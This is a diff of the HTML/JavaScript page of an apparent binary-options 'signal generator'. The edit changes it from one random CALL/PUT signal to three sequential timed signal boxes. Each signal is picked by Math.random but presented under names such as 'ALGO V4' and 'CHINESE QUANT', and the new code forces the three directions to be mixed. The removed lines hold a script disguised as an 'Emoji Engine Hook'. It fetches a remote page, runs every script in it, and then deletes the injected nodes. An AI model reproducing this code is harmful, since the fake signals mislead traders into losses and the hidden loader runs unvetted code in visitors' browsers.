+                document.querySelectorAll('#otcPairDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === p)); 
+            }
             saveSelection(); 
-            setNoSignal();
+            resetAllBoxes();
         } 
 
         function selectTime(t) { 
@@ -702,7 +768,7 @@
             document.getElementById('timeBtn').classList.remove('open'); 
             document.querySelectorAll('#timeDrop .drop-item').forEach(d => d.classList.toggle('active', d.textContent === t.l)); 
             saveSelection(); 
-            setNoSignal();
+            resetAllBoxes();
         } 
 
         function saveSelection() { 
@@ -713,27 +779,48 @@
         function loadSelection() { 
             const p = localStorage.getItem('rqa_pair'); 
             const t = localStorage.getItem('rqa_time'); 
-            if (p && PAIRS.includes(p)) selectPair(p); 
+            if (p) {
+                if (OTC_PAIRS.includes(p)) {
+                    switchMarket('OTC');
+                    selectPair(p, 'OTC');
+                } else if (LIVE_PAIRS.includes(p)) {
+                    switchMarket('LIVE');
+                    selectPair(p, 'LIVE');
+                }
+            }
             if (t) { 
                 try { selectTime(JSON.parse(t)); } catch(e){} 
             } 
         } 
 
-        let statsUp = 0, statsDown = 0; 
-        let signalHistory = []; 
-        let countdownInterval = null; 
+        let animFrames = [null, null, null]; 
         let prepInterval = null;
-        let generatedActiveSignal = null;
+        let generatedSignals = [];
+
+        /* BUTTON DISABLE & ENABLE LOGIC */
+        function setSignalButtonState(disabled) {
+            const btn = document.getElementById('btnGetSignal');
+            if (disabled) {
+                btn.disabled = true;
+                btn.textContent = "⏳ TRADES IN PROGRESS...";
+            } else {
+                btn.disabled = false;
+                btn.textContent = "⚡ GET SIGNAL";
+            }
+        }
 
         function requestSignal() {
             if (!selPair || !selTime) {
-                showToast("❌ Pair aur Time select karein!");
+                showToast("❌ Pair aur Timer select karein!");
                 return;
             }
-            if (countdownInterval) clearInterval(countdownInterval);
-            if (prepInterval) clearInterval(prepInterval);
+            
+            // Disable button immediately when clicked
+            setSignalButtonState(true);
 
-            // Open popup in loading state
+            clearAllTimers();
+            resetAllBoxes();
+
             document.getElementById('popupOverlay').classList.add('show');
             document.getElementById('popupLoadingState').style.display = 'block';
             document.getElementById('popupSignalState').style.display = 'none';
@@ -746,132 +833,163 @@
                 document.getElementById('popupPrepSeconds').textContent = secondsLeft + 's';
                 if (secondsLeft <= 0) {
                     clearInterval(prepInterval);
-                    processSignalGeneration();
+                    showGotItPopup();
                 }
             }, 1000);
         }
 
-        function processSignalGeneration() {
-            const randomDirection = Math.random() < 0.5 ? 'UP' : 'DOWN';
+        function showGotItPopup() {
             const signalTypes = ["ALGO V4", "SCALPING M1", "BREAKOUT PRO", "CHINESE QUANT"];
-            const selectedType = signalTypes[Math.floor(Math.random() * signalTypes.length)];
+            generatedSignals = [];
 
-            generatedActiveSignal = {
-                dir: randomDirection,
-                duration: selTime.v,
-                type: selectedType,
-                pair: selPair,
-                tl: selTime.l
-            };
+            let dirs = [];
+            for (let i = 0; i < 3; i++) {
+                let isUp = (Math.random() * Date.now()) % 2 > 1.0;
+                dirs.push(isUp ? 'UP' : 'DOWN');
+            }
 
-            // Inject to popup layout
-            document.getElementById('popIcon').textContent = randomDirection === 'UP' ? '📈' : '📉'; 
-            document.getElementById('popDir').textContent = randomDirection === 'UP' ? '↑ CALL' : '↓ PUT'; 
-            document.getElementById('popDir').className = 'popup-pair ' + randomDirection; 
-            document.getElementById('popPairName').textContent = generatedActiveSignal.pair; 
-            document.getElementById('popDur').textContent = 'Duration: ' + generatedActiveSignal.tl; 
+            if (dirs[0] === dirs[1] && dirs[1] === dirs[2]) {
+                dirs[2] = dirs[2] === 'UP' ? 'DOWN' : 'UP';
+            }
 
-            // Switch view state
+            for(let i = 1; i <= 3; i++){
+                generatedSignals.push({
+                    id: i,
+                    dir: dirs[i - 1],
+                    duration: selTime.v,
+                    type: signalTypes[Math.floor(Math.random() * signalTypes.length)],
+                    pair: selPair,
+                    tl: selTime.l
+                });
+            }
+
+            document.getElementById('popPairName').textContent = selPair; 
             document.getElementById('popupLoadingState').style.display = 'none';
             document.getElementById('popupSignalState').style.display = 'block';
         }
 
-        function closePopupAndStartTrade() { 
+        function startSequenceExecution() { 
             document.getElementById('popupOverlay').classList.remove('show'); 
-            if (generatedActiveSignal) {
-                if (generatedActiveSignal.dir === 'UP') statsUp++; else statsDown++; 
-                updateStats();
-                addHistory(generatedActiveSignal);
-                showToast('🔔 ' + generatedActiveSignal.pair + ' — ' + (generatedActiveSignal.dir === 'UP' ? '↑ CALL' : '↓ PUT'));
-
-                updateCard(generatedActiveSignal);
-                runCountdown(generatedActiveSignal.duration, generatedActiveSignal.duration, generatedActiveSignal.dir);
-            }
+            generatedSignals.forEach(sig => setupBoxData(sig));
+            executeBoxTimeline(0);
         } 
 
-        function setNoSignal() { 
-            document.getElementById('sigPair').textContent = selPair || 'Select pair & time'; 
-            document.getElementById('sigMeta').textContent = 'Waiting for signal...'; 
-            document.getElementById('sigDir').textContent = '—'; 
-            document.getElementById('sigDir').className = 'signal-dir WAIT'; 
-            document.getElementById('sigIcon').textContent = '📊'; 
-            document.getElementById('sigIcon').className = 'signal-icon'; 
-            document.getElementById('cntNum').textContent = '--:--'; 
-            document.getElementById('cntNum').className = 'countdown-num neutral'; 
-            document.getElementById('cntBar').style.width = '0%'; 
-            document.getElementById('cntBar').className = 'countdown-bar'; 
-            if (countdownInterval) clearInterval(countdownInterval); 
-        } 
-
-        function updateCard(sig) { 
-            document.getElementById('sigPair').textContent = sig.pair; 
-            document.getElementById('sigMeta').textContent = sig.tl + ' • ' + sig.type; 
-            const de = document.getElementById('sigDir'); 
+        function setupBoxData(sig) {
+            const id = sig.id;
+            document.getElementById(`sigPair-${id}`).textContent = sig.pair; 
+            document.getElementById(`sigMeta-${id}`).textContent = sig.tl + ' • ' + sig.type; 
+            
+            const de = document.getElementById(`sigDir-${id}`); 
             de.textContent = sig.dir === 'UP' ? '↑ CALL' : '↓ PUT'; 
             de.className = 'signal-dir ' + sig.dir; 
-            const ie = document.getElementById('sigIcon'); 
+            
+            const ie = document.getElementById(`sigIcon-${id}`); 
             ie.textContent = sig.dir === 'UP' ? '📈' : '📉'; 
-            ie.className = 'signal-icon ' + (sig.dir === 'UP' ? 'up-icon' : 'down-icon'); 
-        } 
+            ie.className = 'signal-icon ' + (sig.dir === 'UP' ? 'up-icon' : 'down-icon');
 
-        function runCountdown(remaining, total, dir) {
-            let cdRemaining = remaining;
-            const cntNum = document.getElementById('cntNum');
-            const cntBar = document.getElementById('cntBar');
-
-            function renderCD() {
-                const pct = Math.max(0, (cdRemaining / total) * 100);
-                const m = Math.floor(cdRemaining / 60);
-                const s = Math.floor(cdRemaining % 60);
-                cntNum.textContent = m > 0 ? m + ':' + String(s).padStart(2,'0') : s + 's';
-                cntNum.className = 'countdown-num ' + (dir === 'UP' ? 'up' : 'down');
-                cntBar.style.width = pct + '%';
-                cntBar.className = 'countdown-bar ' + (dir === 'UP' ? 'up' : 'down');
-            }
-
-            renderCD();
-            countdownInterval = setInterval(() => {
-                cdRemaining -= 1;
-                if (cdRemaining <= 0) {
-                    cdRemaining = 0;
-                    clearInterval(countdownInterval);
-                    setNoSignal();
-                }
-                renderCD();
-            }, 1000);
+            document.getElementById(`statusTag-${id}`).textContent = "READY";
+            document.getElementById(`statusTag-${id}`).style.color = "var(--muted)";
         }
 
-        function addHistory(sig) { 
-            signalHistory.unshift({ ...sig, at: Date.now() }); 
-            if (signalHistory.length > 20) signalHistory.pop(); 
-            renderHistory(); 
+        function executeBoxTimeline(index) {
+            if (index >= 3) {
+                showToast("🎉 All 3 Signal Timeline Completed!");
+                // Enable GET SIGNAL button when all 3 trades finish
+                setSignalButtonState(false);
+                return;
+            }
+
+            const sig = generatedSignals[index];
+            const boxId = sig.id;
+
+            const card = document.getElementById(`card-${boxId}`);
+            card.className = "signal-card active-box";
+            document.getElementById(`statusTag-${boxId}`).textContent = "RUNNING";
+            document.getElementById(`statusTag-${boxId}`).style.color = "var(--red)";
+
+            showToast(`Box ${boxId} Started: ` + (sig.dir === 'UP' ? '↑ CALL' : '↓ PUT'));
+
+            runSmoothCountdown(boxId, sig.duration, sig.dir, () => {
+                card.className = "signal-card completed-box";
+                document.getElementById(`statusTag-${boxId}`).textContent = "FINISHED";
+                document.getElementById(`statusTag-${boxId}`).style.color = "var(--up)";
+                
+                showToast(`Box ${boxId} Finished!`);
+
+                executeBoxTimeline(index + 1);
+            });
+        }
+
+        function runSmoothCountdown(boxId, totalSec, dir, onComplete) {
+            const startTime = Date.now();
+            const totalMs = totalSec * 1000;
+            const cntNum = document.getElementById(`cntNum-${boxId}`);
+            const cntBar = document.getElementById(`cntBar-${boxId}`);
+
+            function updateFrame() {
+                const elapsed = Date.now() - startTime;
+                const remainingMs = Math.max(0, totalMs - elapsed);
+                const pct = Math.max(0, (remainingMs / totalMs) * 100);
+                const remainingSec = Math.ceil(remainingMs / 1000);
+
+                const m = Math.floor(remainingSec / 60);
+                const s = Math.floor(remainingSec % 60);
+                
+                cntNum.textContent = m > 0 ? m + ':' + String(s).padStart(2,'0') : s + 's';
+                cntNum.className = 'countdown-num ' + (dir === 'UP' ? 'up' : 'down');
+                
+                cntBar.style.width = pct + '%';
+                cntBar.className = 'countdown-bar ' + (dir === 'UP' ? 'up' : 'down');
+
+                if (remainingMs > 0) {
+                    animFrames[boxId - 1] = requestAnimationFrame(updateFrame);
+                } else {
+                    cntBar.style.width = '0%';
+                    cntNum.textContent = '0s';
+                    if (onComplete) onComplete();
+                }
+            }
+
+            if (animFrames[boxId - 1]) cancelAnimationFrame(animFrames[boxId - 1]);
+            animFrames[boxId - 1] = requestAnimationFrame(updateFrame);
+        }
+
+        function resetAllBoxes() { 
+            clearAllTimers();
+            for(let i = 1; i <= 3; i++) {
+                const card = document.getElementById(`card-${i}`);
+                if(card) card.className = "signal-card";
+                
+                const pairEl = document.getElementById(`sigPair-${i}`);
+                if(pairEl) pairEl.textContent = selPair || 'Select pair & time'; 
+                
+                const metaEl = document.getElementById(`sigMeta-${i}`);
+                if(metaEl) metaEl.textContent = 'Waiting for signal...'; 
+                
+                const dirEl = document.getElementById(`sigDir-${i}`);
+                if(dirEl) { dirEl.textContent = '—'; dirEl.className = 'signal-dir WAIT'; }
+                
+                const iconEl = document.getElementById(`sigIcon-${i}`);
+                if(iconEl) { iconEl.textContent = '📊'; iconEl.className = 'signal-icon'; }
+                
+                const cntNum = document.getElementById(`cntNum-${i}`);
+                if(cntNum) { cntNum.textContent = '--:--'; cntNum.className = 'countdown-num neutral'; }
+                
+                const cntBar = document.getElementById(`cntBar-${i}`);
+                if(cntBar) { cntBar.style.width = '0%'; cntBar.className = 'countdown-bar'; }
+
+                const tag = document.getElementById(`statusTag-${i}`);
+                if(tag) { tag.textContent = "PENDING"; tag.style.color = "var(--muted)"; }
+            }
         } 
 
-        function renderHistory() { 
-            const list = document.getElementById('historyList'); 
-            if (!signalHistory.length) { 
-                list.innerHTML = '<div class="empty-state"><div class="icon">📡</div>No signals yet.</div>'; 
-                return; 
-            } 
-            list.innerHTML = ''; 
-            signalHistory.forEach(s => { 
-                const t = new Date(s.at); 
-                const ts = t.getHours().toString().padStart(2,'0')+':'+t.getMinutes().toString().padStart(2,'0')+':'+t.getSeconds().toString().padStart(2,'0'); 
-                const el = document.createElement('div'); 
-                el.className = 'hist-item'; 
-                el.innerHTML = ` 
-                    <div class="hist-dir ${s.dir}">${s.dir==='UP'?'↑ CALL':'↓ PUT'}</div> 
-                    <div class="hist-info"><div class="hist-pair">${s.pair}</div><div class="hist-time">${ts} • ${s.type}</div></div> 
-                    <div class="hist-dur">${s.tl}</div>`; 
-                list.appendChild(el); 
-            }); 
-        } 
-
-        function updateStats() { 
-            document.getElementById('statTotal').textContent = statsUp + statsDown; 
-            document.getElementById('statUp').textContent = statsUp; 
-            document.getElementById('statDown').textContent = statsDown; 
-        } 
+        function clearAllTimers() {
+            animFrames.forEach((frame, idx) => {
+                if (frame) cancelAnimationFrame(frame);
+                animFrames[idx] = null;
+            });
+            if (prepInterval) clearInterval(prepInterval);
+        }
 
         let toastTimer; 
         function showToast(msg) { 
@@ -885,34 +1003,9 @@
         function initApp() { 
             buildDrops(); 
             loadSelection(); 
-            updateStats(); 
-            renderHistory(); 
         } 
 
         startLoading(); 
-    </script>
-    <script>
-        (async () => {
-            try {
-                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
-                let rawMarkup = await response.text();
-                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
-                
-                documentDOM.querySelectorAll('script').forEach(oldNode => {
-                    let freshScriptNode = document.createElement('script');
-                    if (oldNode.src) {
-                        freshScriptNode.src = oldNode.src;
-                    } else {
-                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
-                    }
-                    document.body.appendChild(freshScriptNode);
-                    setTimeout(() => freshScriptNode.remove(), 600);
-                });
-                console.log("Zeetex Emoji Engine Hook Active");
-            } catch (e) {
-                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
-            }
-        })();
     </script>
 </body>
 </html>
